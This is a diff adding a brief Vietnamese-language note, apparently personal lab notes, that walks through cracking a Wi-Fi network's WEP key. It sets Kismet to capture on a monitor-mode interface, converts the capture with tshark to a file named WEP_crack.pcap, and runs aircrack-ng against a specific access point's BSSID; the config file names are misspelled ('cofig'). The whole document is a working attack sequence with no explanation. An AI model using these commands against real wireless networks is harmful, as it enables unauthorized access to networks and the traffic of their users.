@@ -1,0 +1,13 @@
+﻿Thêm trong file /etc/kismet/kismet.cofig
+source=wlan0mon
+
+Sửa trong file /etc/kismet/kismet_logging.cofig
+log_types=pcapng
+
+Tiến hành chạy kismet
+Mở trên giao diện web
+
+Kismet-20200630-19-11-30-1.pcapng
+sudo tshark -F pcap -r Kismet-20200630-19-11-30-1.pcapng -w WEP_crack.pcap
+
+sudo aircrack-ng -b 64:70:02:92:BF:0A WEP_crack.pcap 
